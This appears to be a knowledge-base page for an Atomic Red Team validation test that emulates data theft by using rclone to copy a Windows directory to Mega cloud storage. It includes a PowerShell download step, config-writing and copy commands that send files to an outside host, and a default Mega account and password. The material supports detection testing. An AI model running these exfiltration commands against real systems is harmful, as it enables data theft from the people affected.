---
atomic_guid: "8529ee44-279a-4a19-80bf-b846a40dda58"
title: "Exfiltrate data with rclone to cloud Storage - Mega (Windows)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1567.002"
attack_technique_name: "Exfiltration Over Web Service: Exfiltration to Cloud Storage"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1567.002/T1567.002.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "8529ee44-279a-4a19-80bf-b846a40dda58"
  - "Exfiltrate data with rclone to cloud Storage - Mega (Windows)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Exfiltrate data with rclone to cloud Storage - Mega (Windows)

This test uses rclone to exfiltrate data to a remote cloud storage instance. (Mega)
See https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/

## Metadata

- Atomic GUID: 8529ee44-279a-4a19-80bf-b846a40dda58
- Technique: T1567.002: Exfiltration Over Web Service: Exfiltration to Cloud Storage
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1567.002/T1567.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1567-exfiltration_over_web_service|T1567.002]]

## Input Arguments

### dir_to_copy

- description: Directory to copy
- type: string
- default: PathToAtomicsFolder\..\ExternalPayloads\T1567.002

### mega_user_account

- description: Mega user account
- type: string
- default: atomictesting@outlook.com

### mega_user_password

- description: Mega user password
- type: string
- default: vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA

### rclone_config_path

- description: Path to rclone's config file (default should be fine)
- type: path
- default: $env:appdata

### rclone_path

- description: Directory of rclone.exe
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\T1567.002\rclone-v*\

### remote_share

- description: Remote Mega share
- type: string
- default: T1567002

## Dependencies

rclone must exist at (#{rclone_path})

### Prerequisite Check

```text
if (Test-Path "#{rclone_path}") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://downloads.rclone.org/rclone-current-windows-amd64.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\rclone.zip"
Expand-archive -path "PathToAtomicsFolder\..\ExternalPayloads\rclone.zip" -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\T1567.002\" -force
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
New-Item #{rclone_config_path}\rclone -ItemType directory
New-Item #{rclone_config_path}\rclone\rclone.conf
cd "#{rclone_path}"
.\rclone.exe config create #{remote_share} mega
set-Content #{rclone_config_path}\rclone\rclone.conf "[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}"
.\rclone.exe copy --max-size 1700k "#{dir_to_copy}" #{remote_share}:test -v
```

### Cleanup

```powershell
cd "#{rclone_path}"
.\rclone.exe purge #{remote_share}:test
.\rclone.exe config delete #{remote_share}:
Remove-Item #{rclone_config_path}\rclone -recurse -force -erroraction silentlycontinue
cd c:\
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\rclone.zip"
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\T1567.002" -recurse -force
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1567.002/T1567.002.yaml)
